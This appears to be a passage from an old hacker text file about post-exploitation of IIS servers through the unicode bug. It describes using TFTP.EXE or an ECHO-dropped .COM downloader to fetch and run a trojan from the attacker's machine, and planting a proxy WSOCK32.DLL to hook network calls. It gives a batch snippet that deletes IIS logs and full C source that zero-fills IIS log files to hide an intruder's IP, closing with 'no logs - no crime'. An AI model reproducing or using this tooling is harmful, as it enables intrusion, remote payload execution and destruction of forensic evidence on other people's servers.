                additional stuff: TFTPSERV\*.* and ZFTP\*.*

     Some  time  ago IIS unicode bug was very popular, and many good people
 were  playing  with  it.  All  the  methods  of  exploiting IIS using this
 vulnerability were based on the following: since it is possible to execute
 shell  commands  on  the vulnerable machine, it is possible to upload some
 executable file there and execute it.
     And there were some common methods of uploading executable files:

     1. Using TFTP.EXE

        - run TFTP server, which will serve some trojan executable
        - by means of TFTP.EXE, download executable from TFTP server
        - execute downloaded file

     2. using ECHO command

        - by means of ECHO command, create some text file
        - execute created file

     More info about details of this stupid useless things you can read out
 of here, for sure.

     Main problem of all these methods were file uploading.
     All  win32 TFTP servers were working in GUI-mode, which is sucks, same
 as  uploading  different .ASPs, scripts and other shit -- because this all
 is  not  automation-oriented  stuff.  There were also sources of unix TFTP
 server, which makes win32 programmer crying when looking into.

     So, here will be presented the following things:

     1. Sources of console multithreaded win32 TFTP server,
        which allows only GET method, tested with win2k::TFTP.EXE

        NOTE:
          TFTP.EXE, when GET'ting, opens for w+ temporary file,
          such as TFTP-nnnnnnn., which then marked as read-only.
          Name of this temporary file is choosen depending not
          on seconds, but on some other time structure fields,
          so, when TFTP.EXE is remotely executed several times with
          small time interval, it results in error
          'can't write to local file 'xxx'' -- because stupid TFTP.EXE
          can not reopen for w+ own temporary readonly file.

     2. ZFTP Client and Server:
          BASE64-alike encoded .COM file (0..9,A..Z,a..z,-,_),
          to be dropped by means of ECHO command,
          which then downloads and runs main executable.
          It is also useful when TFTP.EXE is deleted
          by some unknown motherfucker.

                        ZFTP CLIENT/SERVER for win32
                        ----------------------------

  machine_A(hax0r):
    1. run ZFTP SERVER (listen for connections)
    2. by means of ECHO command, drop .COM file (ZFTP CLIENT)
    2. remotely run ZFTP CLIENT on machine_B,
       specifying server's ip/port in cmdline

  machine_B(target):
    1. ZFTP CLIENT: contact ZFTP SERVER on machine_A
    2. download some file from server
    3. run downloaded file

  CLIENT's commandline specifies server port & ip, to connect to.

    C:\>CLIENT.COM ____30397F000001

      ____        -->signature
      3039        -->htons(server_port), here 12345
      7F000001    -->server ip, address of machine_A, to download file from,
                     here 127.0.0.1

     ZFTP   protocol   is  simple  TCP  file  xfer,  initiated  by  client.
 Transferred  file  is padded by AA,55,AA,55 bytes. After file is sent, TCP
 session  is closed by server, and then client checks this 4-byte signature
 to decide if file is transferred ok.

                                   Notes
                                   -----

     Both  servers  are  multithreaded,  and  oriented  to long independend
 serving. For each server's address there created independed server thread,
 which  listens  for  incoming  connections on corresponding IP. This means
 that  you  can  use  any  IP if server is running on machine with multiple
 addresses.  When client is connecting, there also created client's thread,
 in  which  file  is  passed  to  client.  There  are  also created special
 monitoring  thread,  which  check client/server threads and kills/restarts
 them  if  they're  halted.  While  this  process  all  handles/sockets are
 correctly  closed,  so  there  will  be  no memory leak. Also both servers
 allows adding SEH (try/except), to make'em more reliable.

     To  make  server  working  right, remove debug logging (log.cpp), then
 change -lap to -laa (cui-->gui) in the make.bat file, and recompile.

                               WinSock Logger
                               --------------

                       additional stuff: WSOCKLOG\*.*

     This stuff will show you how to re-write standard system DLL's, making
 them  working  same  as  original  ones. Also, it describes my own WinSock
 Logger, which i wrote when was learning WinSock API.

     This  logger  is  based  on the following idea: when PE EXE program is
 executed,  DLL  files  are searched at first in the current directory, and
 only  after that in the system ones. So, we can put our own WSOCK32.DLL to
 the same directory with EXE file, and in this way hook and process all the
 WinSock API calls.

     The  main  trick  is  to write own WSOCK32.DLL having exactly the same
 exported  functions  as  original  one  has;  and all these functions must
 have the same ordinal values within PE Export Table structure.

     The  same  exported functions problem can be solved by writing all own
 functions which will call original ones, as shown below:

u_long WSAAPI old_ntohl (IN u_long netlong);

u_long WSAAPI new_ntohl (IN u_long netlong)
{
  return old_ntohl(netlong);
}

  // original send(), will be imported from WSOCKXX.DLL(old WSOCK32.DLL)
int WSAAPI old_send (
                     IN SOCKET s,
                     IN const char FAR * buf,
                     IN int len,
                     IN int flags);

  // new send(), will be exported from WSOCK32.DLL
int WSAAPI new_send (
                     IN SOCKET s,
                     IN const char FAR * buf,
                     IN int len,
                     IN int flags)
{
  // options --> process send ?
  if ((x_options[ID_SEND]&1)==0)
    return old_send(s, buf, len, flags);
  // log call
  log("* send(socket=%08X, len=%08X, flags=%s)", (DWORD)s, len, flagstr(flags));
  // options --> log send() data ?
  if (x_options[ID_SEND]==3)
    dump_buf((char*)buf,len);
  // call original send()
  int res = old_send(s, buf, len, flags);
  // log result
  log("  returns %08X, error=%s", res, wsaerrmsg());;
  // return
  return res;
} // new_send()

     The  problem  with  ordinals  is  a  bit  more hard, because ordinals,
 written  in  .DEF  file,  are  incorrectly  processed  by TLINK32.EXE. So,
 special  program  called  'ordinal'  was  written, which re-sorts ordinals
 within PE files corresponding to given .DEF file.

     Well,  after  you  understood  how this all was done, take a look into
 ws32_??.cpp:  it  has not only documented winsock api function prototypes,
 but  also  all other function prototypes i've found within WSOCK32.DLL, on
 both  98  and  2k systems. Also note, that 98 and 2k systems has different
 undocumented functions within WSOCK32.DLL, and different ordinal values.

     Now,  about  how  this  all worx. Just put WSOCK32.DLL and WSOCKXX.DLL
 from  W2K  or  W98 directory into directory with program you're interested
 in;  then  run  (or re-run) this program and enjoy. Also, both DLLs can be
 put  into  %SystemDirectory%,  and  as  such  you  will  be  able  to  log
 everything.

     CONFIG  is  simple  logger  configuration editor, it just edits logger
 settings  which  are  all stored in registry. Note, that modified settings
 are applied when DLL is loaded into memory: no difference, by loader or by
 LoadLibrary,  so,  when  changing  configuration,  dont  forget to restart
 debugging application.

                        IIS Log Cleaning in Run-Time
                        ----------------------------

                        additional stuff: IISLOG\*.*

     Some people, who played with IIS servers enough, know, that by default
 there are log files, located in

                %SystemDirectory%\LogFiles\W3SVC1\yymmdd.log

     These  files  contains all http requests sent to IIS server, including
 source IP addresses. While IIS is running, current log file is opened, and
 can  not  be  deleted.  So,  some good people does this: by means of ECHO,
 create and execute .BAT file, containing the following:

      iisreset /stop
      del %systemdir%\LogFiles\W3SVC1\*.log
      iisreset /start

     It will stop IIS service, delete log files and start IIS again.

     This method has the following problems:

     1. In some cases service will not stop.
     2. In other cases it will not start. ;-)
     3. Log files may be configured to be located in another place.
     4. Such log deletion can not be checked,
        because each http request results in correspoding log record,
        _after_ the request is processed - so, even if you will
        delete log file with some request,
        right after that new log file will be created
        with new 1st record containing your IP.

     There  is  another method, which based on the following fact: log file
 is  opened  in  compatible mode, allowing it to be opened in read-write by
 other  processes.  And  all we need to do is to open log file for rw using
 FILE_SHARE_READ | FILE_SHARE_WRITE flags.

     So,  the  right way is not to delete log files, and not to hide within
 tons  of  IP  addresses  of  other  stupid  haxor,  but  to  fuck  machine
 completely:  by  uploading  there  executable program which will clear log
 files with high reliability.

     And here is log-cleaning part of such program:

#define C_IIS_KEYPATH "SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters"
#define C_IIS_LOGSUBKEY "LogFileDirectory"

#define IISLOG_BLOCK_SIZE      65536

void cleaniislogfile(char* filename)    // clean single .log file
{
  // open LOG file in compatible mode
  HANDLE h = CreateFile(filename,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN,
                        NULL);
  // return if not opened
  if (h == INVALID_HANDLE_VALUE) return;
  // allocate some temporary buffer
  DWORD buflen;
  char* buf = (char*)malloc( IISLOG_BLOCK_SIZE+1 );
  if (buf != NULL)
  {
    // if allocated, zerofill
    memset(buf, 0x00, IISLOG_BLOCK_SIZE);
    // get file size
    DWORD len = GetFileSize(h, NULL);
    // zerofill file
    while(len)
    {
      DWORD buflen = MIN( len, IISLOG_BLOCK_SIZE );
      WriteFile(h, buf, buflen, &buflen, NULL);
      len -= buflen;
    }
    // free allocated memory
    free(buf);
  }
  // close file
  CloseHandle(h);
} // cleaniislogfile()

void cleaniislogrecursive(char* path, int reclevel)  // search for .log files
{
  // copy path to search in
  char* buf = (char*)malloc(strlen(path)+MAXPATH+2);
  if (buf==NULL) return;
  strcpy(buf, path);
  // add \ if needed
  if (strrchr(buf,'\\')+1!=strchr(buf,0)) strcat(buf, "\\");
  char* bufend = strchr(buf, 0);
  // add *.*
  strcat(buf, "*.*");
  // start search
  WIN32_FIND_DATA ff;
  HANDLE h = FindFirstFile(buf, &ff);
  if (h != INVALID_HANDLE_VALUE)
  {
    for(;;) // for each file found
    {
      // form full path and file name
      strcpy(bufend, ff.cFileName);
      // if directory
      if (ff.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      {
        if (strcmp(ff.cFileName, "." )!=0)
        if (strcmp(ff.cFileName, "..")!=0)
          if (reclevel == 0)
            // logs are contained in LogFiles\W3SVC\ directory by default
            if (strncmpi(ff.cFileName, "W3SVC", 5)==0)
              cleaniislogrecursive(buf, reclevel+1);
      }
      else
      {
        char* t = strrchr(ff.cFileName,'.');
        if (t && (stricmp(t,".log")==0))
          cleaniislogfile(buf); // zerofill found file
      }
      // find next file, exit if no more files
      if (FindNextFile(h, &ff) == 0) break;
    }
    // stop search
    FindClose(h);
  }
  // free allocated memory
  free(buf);
} // cleaniislogrec()

  // clear everything. call it from your src.
  // be sure that current http request processing by iis has been finished.
void CleanIISLogs()
{
  // 1. \WINNT\SYSTEM32\LogFiles
  cleaniislogrecursive("\\WINNT\\SYSTEM32\\LogFiles\\",0);
  // 2. C:\WINNT\SYSTEM32\LogFiles
  cleaniislogrecursive("C:\\WINNT\\SYSTEM32\\LogFiles\\",0);
  // 3. %SystemDirectory%\LogFiles
  char temp[MAXPATH];
  GetSystemDirectory(temp,MAXPATH);
  strcat(temp, "\\LogFiles\\");
  cleaniislogrecursive(temp,0);
  // 4. %SYSTEM\CurrentControlSet\Services\W3SVC\Parameters.LogFileDirectory%
  // open key
  HKEY hKey;
  if ( RegOpenKeyEx(HKEY_LOCAL_MACHINE, C_IIS_KEYPATH, 0, KEY_QUERY_VALUE,
                    &hKey) != ERROR_SUCCESS ) return;
  // get key value (log files directory)
  char buf[1024];
  DWORD buflen = sizeof(buf);
  if ( RegQueryValueEx(hKey, C_IIS_LOGSUBKEY, 0,
                       NULL, buf, &buflen) == ERROR_SUCCESS )
  {
    // can contain %SystemDirectory% - alike environment strings, so expand
    char expbuf[1024];
    ExpandEnvironmentStrings(buf, expbuf, sizeof(expbuf));
    // find & clean logs
    cleaniislogrecursive(expbuf, 0);
  }
  RegCloseKey(hKey);
} // CleanIISLogs()

     Well, thats all. And remember: no logs - no crime.
